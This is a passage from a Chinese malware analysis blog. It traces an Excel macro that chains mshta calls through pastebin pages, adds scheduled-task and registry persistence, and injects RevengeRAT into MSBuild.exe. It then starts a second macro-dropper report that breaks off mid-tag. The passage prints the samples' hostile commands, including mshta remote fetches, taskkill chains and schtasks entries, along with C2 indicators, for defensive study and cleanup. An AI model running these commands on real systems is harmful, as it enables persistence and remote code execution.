title="查看宏"></a>查看宏</h2><p>该样本是一个Excel文件并且带有宏，首先查看宏代码，发现有密码，可以使用工具offkey获取密码来解密。</p><p>查看宏代码，其中值得关注的便是函数<code>workbook_Open()</code>，Workbook_Open和Auto_Open差不多都能实现在打开office时自动运行。该函数中有明显的执行函数<code>shell()</code>，然后在shell处下断点，然后进行调试来查看所执行的指令。调试出来的指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;mshta http[:]&#x2F;&#x2F;bit.ly&#x2F;8hsshjahassahsh&quot;</span><br></pre></td></tr></table></figure><p>通过执行mshta，去访问指定的域名。调试结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1568959569555.png" alt="1568959569555"></p><h2 id="异常JS代码"><a href="#异常JS代码" class="headerlink" title="异常JS代码"></a>异常JS代码</h2><p>访问指令中的域名，发现是一个正常的网页，然后将网页源码拷下来，发现该网页源码中，有一段异常的JS代码，其中使用了函数<code>document.write</code>。异常JS代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1568986274183.png" alt="1568986274183"></p><p>使用<code>console.log</code>解析异常JS代码，解析出来了一个VBS代码。也就说明了网页执行到该异常JS代码时，会通过执行<code>document.write</code>，将该VBS代码嵌在了网页文档中，所以==宏调用的mshta真正执行的其实就是这个VBS代码==。这里将其保存下来，并命名为1.vbs。解析出来的VBS代码，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1568986836029.png" alt="1568986836029"></p><p>调试该VBS代码（1.vbs），发现该VBS再次调用了指令：<code>mshta</code>，去访问网址来执行操作。mshta指令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta “http[:]&#x2F;&#x2F;www.pastebin.com&#x2F;raw&#x2F;nv5d9pYu&quot;</span><br></pre></td></tr></table></figure><p>调试1.VBS结果如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569030736561.png" alt="1569030736561"></p><h2 id="添加计划任务和开机自启"><a href="#添加计划任务和开机自启" class="headerlink" title="添加计划任务和开机自启"></a>添加计划任务和开机自启</h2><p>再去访问1.VBS执行指令中的网址，发现还是一个正常的网址，网址源码中含有异常JS代码。1.VBS所访问网址中的异常JS代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569036067621.png" alt="1569036067621"></p><p>解析该JS代码，发现与上一步一模一样的，还是==解析出来VBS代码，交由mshta==去执行。该样本通过这样的手段，访问正常的网站，然后去执行隐藏在网页中的恶意代码，来隐藏自身的恶意行为，并且可以==实现无文本执行恶意行为==，来逃避查杀。解析出的VBS代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569036586575.png" alt="1569036586575"></p><p>将调试出来的VBS代码保存下来，并命名为2.VBS。然后调试2.VBS，2.VBS主要行为如下：</p><p>1.关闭进程，关闭Word、Excel、Publisher、PPT程序。关闭这些程序，目的可能是用来隐藏恶意程序的来源与 。 执行指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c taskkill &#x2F;f &#x2F;im winword.exe &amp; taskkill &#x2F;f &#x2F;im excel.exe &amp; taskkill &#x2F;f &#x2F;im MSPUB.exe &amp; taskkill &#x2F;f &#x2F;im POWERPNT.EXE &amp; exit</span><br></pre></td></tr></table></figure><p>2.设置两个计划任务，分别为每60分钟和每300分钟调用一次mshta，并分别访问了两个不同的URL。而且还将计划任务的名字设置为与系统更新相关的内容。执行指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;sc MINUTE &#x2F;mo 60 &#x2F;tn &quot;Windows Update&quot; &#x2F;tr &quot;mshta.exe http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;vXpe74L2&quot; &#x2F;F</span><br><span class="line">schtasks &#x2F;create &#x2F;sc MINUTE &#x2F;mo 300 &#x2F;tn &quot;Update&quot; &#x2F;tr &quot;mshta.exe http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;JdTuFmc5&quot; &#x2F;F</span><br></pre></td></tr></table></figure><p>3.设置开机自启动项，修改注册表添加自启动项。致使每次开机便会执行mshta，访问指定URL。修改的注册表，及执行的指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate&quot;</span><br><span class="line">&quot;mshta.exe http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;CGe3S2Vf&quot;,&quot;REG_EXPAND_SZ&quot;</span><br></pre></td></tr></table></figure><p>调试2.VBS结果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569043864988.png" alt="1569043864988"></p><p>其中计划任务和开机自启项中，mshta访问的URL如下表：</p><table><thead><tr><th>访问的URL</th></tr></thead><tbody><tr><td>http[:]//pastebin.com/raw/vXpe74L2</td></tr><tr><td>http[:]//pastebin.com/raw/JdTuFmc5</td></tr><tr><td>http[:]//pastebin.com/raw/CGe3S2Vf</td></tr></tbody></table><h2 id="执行Powershell"><a href="#执行Powershell" class="headerlink" title="执行Powershell"></a>执行Powershell</h2><p>继续去访问这3个URL，发现这3个URL的内容都是一样的，可见所有的持久化攻击的目的都是一致的，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569044804280.png" alt="1569044804280"></p><p>这里还是与之前的套路是一样的，还是将JS解析后的VBS代码，==交由mshta去执行解析后vbs中的代码,来实现无文本攻击==。解析出的VBS代码结果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569045476737.png" alt="1569045476737"></p><p>将解析出来的VBS保存为3.VBS，然后调试该VBS代码，发现3.VBS执行了powershell指令，调试结果如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569046502014.png" alt="1569046502014"></p><p>查看<code>Powershell</code>的指令，发现powershell，将初始化的数据转为字符串并执行。这里通过调试来获取Powershell执行的数据，如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569049413413.png" alt="1569049413413"></p><h2 id="从网页获取文件数据"><a href="#从网页获取文件数据" class="headerlink" title="从网页获取文件数据"></a>从网页获取文件数据</h2><p>分析powershell执行的指令，首先通过<code>test-connection</code>不断尝试谷歌进行链接，来判断网络连接情况。</p><p>然后调用<code>CallByName</code>执行<code>DownloadString</code>从执行下表中的两个链接中下载字符串，然后通过IEX执行下载后的指令。</p><table><thead><tr><th>下载字符串连接地址：</th></tr></thead><tbody><tr><td>http[:]//pastebin.com/raw/wMG90xwi</td></tr><tr><td>http[:]//pastebin.com/raw/W455MKAZ</td></tr></tbody></table><p>代码如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569059441086.png" alt="1569059441086"></p><h3 id="1-获取DLL文件流"><a href="#1-获取DLL文件流" class="headerlink" title="1.获取DLL文件流"></a>1.获取DLL文件流</h3><p>访问第一个网址==wMG90xwi==，发现从该网址上下载下来的==powershell==指令与上一个差不多，都是将初始化的数据，然后执行。这里直接调试，并将调试的结果输出到7.txt中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569060163393.png" alt="1569060163393"></p><p>查看生成的7.txt，发现又是一层执行。可以从中看出是一个==PE==文件，数据开头4D5A，而且该powershell执行的主要目的在于替换其中的数据，然后替换完数据，由通过load去加载替换后的比特流，初步推断替换后的是一个dll文件。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569065604284.png" alt="1569065604284"></p><p>通过将<code>IEX</code>替换为<code>out-file</code>, 获取这个PE文件。通过==DIE==查看该PE文件，发现该PE文件正如猜想为一个dll文件，这也就说明了，这里通过==函数<code>load</code>加载了一个从网上获取到的dll文件的数据流==，依旧还是无文本模式。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569066094943.png" alt="1569066094943"></p><h3 id="2-获取exe文件流"><a href="#2-获取exe文件流" class="headerlink" title="2.获取exe文件流"></a>2.获取exe文件流</h3><p>访问第二个网址==W455MKAZ==，发现这次从该网址上下载的字符串直接是一个PE文件的数据流，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569066429620.png" alt="1569066429620"></p><p>这里将其转换为二进制粘贴到文件中，就能获得该文件。用==DIE==查该文件，发现是一个.Net编写的exe文件。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569066582960.png" alt="1569066582960"></p><p>上面两步获取的文件流，并没有保存到本地，而是以比特流的形式存储的。这样的目的是不生成文件，很大程度上能做到免杀。</p><h2 id="反射动态加载"><a href="#反射动态加载" class="headerlink" title="反射动态加载"></a>反射动态加载</h2><p>获取完EXE和DLL文件流之后，该样本通过==反射加载==，加载了该DLL。执行了该DLL中的==retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe==方法，并将<code>（&quot;MSBuild.exe&quot;，$f）</code>作为参数传入该方法中，其中$f为获取到的EXE的二进制文件流数据。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569068224763.png" alt="1569068224763"></p><h2 id="创建傀儡进程"><a href="#创建傀儡进程" class="headerlink" title="创建傀儡进程"></a>创建傀儡进程</h2><p>该样本通过反射加载了DLL文件中的函数==retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe==，并传进了两个参数，一个是字符串<code>&quot;MSBuild.exe&quot;</code>，一个exe文件的比特流数组。查看该函数对这两个参数或这个函数干了些什么。</p><h3 id="1-解混淆"><a href="#1-解混淆" class="headerlink" title="1.解混淆"></a>1.解混淆</h3><p>通过反编译工具==dnspy==，查看该.Net编写的dll文件时，发现其中有大量的混淆内容，查看编辑模块中的自定义特性发现该DLL文件是通过<code>ConfuserEx</code>混淆过的。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569069138757.png" alt="1569069138757"></p><p>可以通过该混淆制作者公布的工具，进行解混淆。并找到反射加载的函数，还发现该DLL文件中，有一些创建傀儡进程会用到的API，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569069784184.png" alt="1569069784184"></p><h3 id="2-创建进程并写入数据"><a href="#2-创建进程并写入数据" class="headerlink" title="2.创建进程并写入数据"></a>2.创建进程并写入数据</h3><p>从反射加载的函数，往下跟，发现函数<code>semthod_0</code>,创建进程MSBuild，并将其挂起，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569070252322.png" alt="1569070252322"></p><p>然后，该函数还往该进程内存中写入获取到的EXE文件的数据流，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569070459004.png" alt="1569070459004"></p><p>通过执行函数<code>ResumeThread</code>恢复线程，执行EXE文件，完成傀儡进程。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569071085088.png" alt="1569071085088"></p><h2 id="实施远控"><a href="#实施远控" class="headerlink" title="实施远控"></a>实施远控</h2><p>通过反射加载该DLL文件，执行方法==retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe==，来创建傀儡进程，将获取到的EXE加载到==正常程序MSBuild.exe中==，来免杀。</p><p>注入该傀儡进程的获取到的EXE文件，实质上是一个==远控==，通过查询互斥体，可知道该远控为<code>RevengeRAT</code>，该远控的C&amp;C服务器为：==meandmyjoggar.duckdns.org:777==，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569072354028.png" alt="1569072354028"></p><p>由于该<code>RevengeRAT</code>远控是一个成熟的远控程序，网上也可以直接下载到该远控软件，这里就不过多去分析该远控程序。</p><h1 id="0x02-查杀方案"><a href="#0x02-查杀方案" class="headerlink" title="0x02 查杀方案"></a>0x02 查杀方案</h1><ul><li><p>关闭傀儡进程</p><p>关闭创建的<code>MSBuild.exe</code>的傀儡进程。</p></li><li><p>删除计划任务</p><p>删除创建的两个计划任务：<code>Windows Update</code>、<code>Update</code></p><p>可执行如下指令删除计划任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;Delete &#x2F;TN &quot;Windows Update&quot; &#x2F;F</span><br><span class="line">schtasks &#x2F;Delete &#x2F;TN Update&quot; &#x2F;F</span><br></pre></td></tr></table></figure></li><li><p>删除开机自启动项</p><p>删除注册表项==HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate==</p></li></ul><h1 id="0x03-样本溯源"><a href="#0x03-样本溯源" class="headerlink" title="0x03 样本溯源"></a>0x03 样本溯源</h1><p>通过mshta访问的网址如下表：</p><table><thead><tr><th>捆绑恶意JS代码网址：</th></tr></thead><tbody><tr><td>==http[:]//bit.ly/8hsshjahassahsh==</td></tr><tr><td>==http[:]//pastebin.com/raw/nv5d9pYu==</td></tr><tr><td>==http[:]//pastebin.com/raw/vXpe74L2==</td></tr><tr><td>==http[:]//pastebin.com/raw/JdTuFmc5==</td></tr><tr><td>==http[:]//pastebin.com/raw/CGe3S2Vf==</td></tr><tr><td>==http[:]//pastebin.com/raw/wMG90xwi==</td></tr><tr><td>==http[:]//pastebin.com/raw/W455MKAZ==</td></tr></tbody></table><p>远控<code>RevengeRAT</code>的C&amp;C服务器：</p><table><thead><tr><th>C&amp;C服务器</th></tr></thead><tbody><tr><td>==meandmyjoggar.duckdns.org:777==</td></tr></tbody></table><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><blockquote><p>该样本通过Excel进行传播，攻击手段高超，全程无文本攻击，其间进行了多次混淆，通过访问正常网址获取指令和数据，反射加载获取到的DLL文件流，来创建傀儡进程，最终执行远控程序。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 宏病毒 </tag>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> APT </tag>
            
            <tag> 远控木马 </tag>
            
            <tag> 非PE脚本语言样本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宏病毒分析报告</title>
      <link href="2019/10/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/"/>
      <url>2019/10/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>04 宏病毒分析报告</b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center">3EFFEBA64D9A1A4DD1BDDAEB1858E4D0.xls</th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>宏病毒、下载器</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>346112 bytes</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>3EFFEBA64D9A1A4DD1BDDAEB1858E4D0</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>该样本通过宏代码，将存储在Excel表中的PE数据，写入DLL文件中，然后加载该DLL文件，执行其函数，最终实现将主机信息发送至远端服务器，并从远端服务器下载文件执行。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/04_%E5%AE%8F%E7%97%85%E6%AF%92.png" alt="04_宏病毒"></p><h1 id="0x01-样本行为分析"><a href="#0x01-样本行为分析" class="headerlink" title="0x01 样本行为分析"></a>0x01 样本行为分析</h1><p>该样本是一个Excel文件并且含有宏。其中Excel界面同其他宏病毒一样，显示迷惑信息，诱导使用者启用宏。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569412801269.png" alt="1569412801269"></p><h2 id="文件写入行为分析"><a href="#文件写入行为分析" class="headerlink" title="文件写入行为分析"></a>文件写入行为分析</h2><p>运行宏后，样本释放了多个文件，如图1所示：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569144868910-1569145595739.png" alt="1569144868910"></p><center>图1</center>## 网络行为分析<p>运行宏后，该Excel文件向远程服务器进行了TCP请求，访问IP：==195.126.214.226==</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569145641922.png" alt="1569145641922"></p><center>图2</center># 0x02 样本详细分析<h2 id="查看宏代码"><a href="#查看宏代码" class="headerlink" title="查看宏代码"></a>查看宏代码</h2><p>查看自动运行函数<code>workbook_open</code>，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569378101721.png" alt="1569378101721"></p><p>分析<code>workbook_open</code>，发现函数只执行了<code>UserForm1.show</code>，这点就很可疑，因为userForm本身是一个图片，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569412973717.png" alt="1569412973717"></p><p>这里右键查看模块<code>UserForm1</code>的代码，发现里面暗藏玄机，执行了函数<code>CreateGifFile</code>,如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569413132917.png" alt="1569413132917"></p><p>查看函数<code>CreateGifFile</code>,发现其中释放出了一个==DLL文件==，并执行了该DLL文件中的一个函数。下面将详细分析该函数究竟执行了那些行为，函数如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569413932292.png" alt="1569413932292"></p><p><strong>拼接路径</strong></p><p>根据操作系统的位数，拼接不同的文件路径，拼接出来的路径就是该样本释放文件的路径，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569414410071.png" alt="1569414410071"></p><p><strong>释放文件<code>oleObject1.bin</code></strong></p><p>先将当前工作表复制到一个新的工作簿中，并保存为==13.xlsx==，然后又修改该文件的后缀，将其修改为==13.xlsx.zip==，然后解压该zip文件夹 ==xl\embeddings\==目录下的<code>oleObject1.bin</code>文件。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569415043752.png" alt="1569415043752"></p><p>首先释放的3个文件，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569415375138.png" alt="1569415375138"></p><p>执行函数<code>ReadAndWriteExtractedBinFile</code>，读取文件==oleObject1.bin==中的PE数据，并将PE数据写入<code>exchange1.dll</code>中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569419064051.png" alt="1569419064051"></p><p><strong>加载<code>exchange1.dll</code>并执行函数<code>Amway</code></strong></p><p>先切换路径至==%AppData%路径下==，然后加载<code>exchange1.dll</code>，并执行其函数<code>Amway</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569419166214.png" alt="1569419166214"></p><p>其中<code>k32LL</code>为从==kernel32.dll==中获取的<code>loadlibrary</code>，并将其别名为：<code>k32LL</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569419372444.png" alt="1569419372444"></p><h2 id="分析释放出来的DLL文件"><a href="#分析释放出来的DLL文件" class="headerlink" title="分析释放出来的DLL文件"></a>分析释放出来的DLL文件</h2><p>查看DLL文件<code>exchange1.dll</code>的导出表，发现其导出函数只有一个导出函数<code>initTest</code>。与该样本要调用的函数<code>Amway</code>不同。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569425835760.png" alt="1569425835760"></p><p>初步推断该DLL文件，是一个==带壳的DLL文件==，首先需要进行脱壳，这里用X64dbg进行脱壳。</p><p>首先在DLL文件的入口点，用一次==ESP定律==，在push后，给<code>ESP</code>下硬件断点，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569426153856.png" alt="1569426153856"></p><p>然后F9运行到硬件断点出，然后单步没有几步，就会看到一个<code>pushad</code>，这里再次用ESP定律，给<code>ESP</code>下硬件断点。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569426325644.png" alt="1569426325644"></p><p>然后就到了该DLL真正的入口点，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569426396535.png" alt="1569426396535"></p><p>然后将其dum下来，这里需要注意要修改插件==Scylla==的属性，去掉选项<code>Use PE header from disk</code>，这个选项用的是原来DLL的PE头，也就是执行原来壳的PE头中的导出表，这里需要将其勾掉。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569426822212.png" alt="1569426822212"></p><p>再查dump出来的DLL文件，发现导出表正常了，找到了调用执行的函数<code>Amway</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569426966404.png" alt="1569426966404"></p><h2 id="分析主要行为函数"><a href="#分析主要行为函数" class="headerlink" 